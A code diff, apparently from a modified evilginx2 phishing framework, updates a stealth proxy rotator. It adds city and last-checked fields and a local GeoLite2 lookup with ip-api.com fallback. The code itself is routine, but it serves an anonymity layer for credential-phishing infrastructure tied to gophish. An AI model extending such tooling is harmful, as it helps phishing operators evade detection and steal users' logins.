@@ -11,11 +11,13 @@ import (
 	"net"
 	"net/http"
 	"net/url"
+	"os"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/oschwald/geoip2-golang"
 )
 
 // AnonymityEngine provides advanced anonymity and stealth capabilities
@@ -63,6 +65,8 @@ type ProxyInfo struct {
 	Password    string            `json:"password,omitempty"`
 	Country     string            `json:"country,omitempty"`
 	Region      string            `json:"region,omitempty"`
+	City        string            `json:"city,omitempty"` // Added for frontend compatibility
+	LastChecked time.Time         `json:"last_checked"`   // Added for frontend tracking
 	LastUsed    time.Time         `json:"last_used"`
 	SuccessRate float64           `json:"success_rate"`
 	Latency     time.Duration     `json:"latency"`
@@ -1068,6 +1072,7 @@ func (pr *ProxyRotator) TestProxy(index int) (bool, string, error) {
 
 	pr.mu.Lock()
 	if index < len(pr.proxies) {
+		pr.proxies[index].LastChecked = time.Now() // Update LastChecked timestamp
 		pr.proxies[index].Latency = time.Duration(latencyMs) * time.Millisecond
 		if success {
 			pr.proxies[index].Active = true
@@ -1078,6 +1083,7 @@ func (pr *ProxyRotator) TestProxy(index int) (bool, string, error) {
 			}
 			if city != "" {
 				pr.proxies[index].Region = city // Store city in Region field
+				pr.proxies[index].City = city   // Store city in City field for frontend
 			}
 			// PRESERVE InUse state - don't overwrite if proxy is assigned to a session
 			if wasInUse {
@@ -1118,25 +1124,81 @@ func lookupProxyGeo(ip string) (country, city, countryCode string) {
 		return "Local", "", ""
 	}
 
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get(fmt.Sprintf("https://ipapi.co/%s/json/", ip))
+	// 1. Try Local MaxMind GeoLite2 DB
+	// Check common locations defined in setup.sh
+	dbPaths := []string{
+		"gophish/static/db/geolite2-city.mmdb",
+		"evilfeed/GeoLite2-City.mmdb",
+	}
+
+	for _, path := range dbPaths {
+		if _, err := os.Stat(path); err == nil {
+			db, err := geoip2.Open(path)
+			if err != nil {
+				continue
+			}
+
+			parsedIP := net.ParseIP(ip)
+			if parsedIP != nil {
+				record, err := db.City(parsedIP)
+				if err == nil {
+					country = record.Country.Names["en"]
+					city = record.City.Names["en"]
+					countryCode = record.Country.IsoCode
+
+					db.Close()
+					if country != "" {
+						return country, city, countryCode
+					}
+				}
+			}
+			db.Close()
+			break // DB found but lookup failed or no data
+		}
+	}
+
+	// 2. Switch to ip-api.com for better reliability (rate limit: 45 req/min)
+	// ipapi.co is completely failing / strict rate limits
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s", ip))
 	if err != nil || resp.StatusCode != 200 {
-		return "Unknown", "", ""
+		// Fallback to ipapi.co if ip-api.com fails
+		if resp != nil {
+			resp.Body.Close()
+		}
+		resp, err = client.Get(fmt.Sprintf("https://ipapi.co/%s/json/", ip))
+		if err != nil || resp.StatusCode != 200 {
+			return "Unknown", "", ""
+		}
 	}
 	defer resp.Body.Close()
 
 	var geo struct {
-		Country     string `json:"country_name"`
+		// Field mapping for ip-api.com
+		Country     string `json:"country"`
 		City        string `json:"city"`
-		CountryCode string `json:"country_code"`
+		CountryCode string `json:"countryCode"`
+		// Field mapping for ipapi.co
+		CountryNameCo string `json:"country_name"`
+		CountryCodeCo string `json:"country_code"`
 	}
 
 	body, _ := ioutil.ReadAll(resp.Body)
-	if json.Unmarshal(body, &geo) != nil {
+	if err := json.Unmarshal(body, &geo); err != nil {
 		return "Unknown", "", ""
 	}
 
-	return geo.Country, geo.City, geo.CountryCode
+	// Unify fields (handle both API formats)
+	cName := geo.Country
+	cCode := geo.CountryCode
+	if cName == "" {
+		cName = geo.CountryNameCo
+	}
+	if cCode == "" {
+		cCode = geo.CountryCodeCo
+	}
+
+	return cName, geo.City, cCode
 }
 
 // TestAllProxies tests all proxies in the pool and returns stats
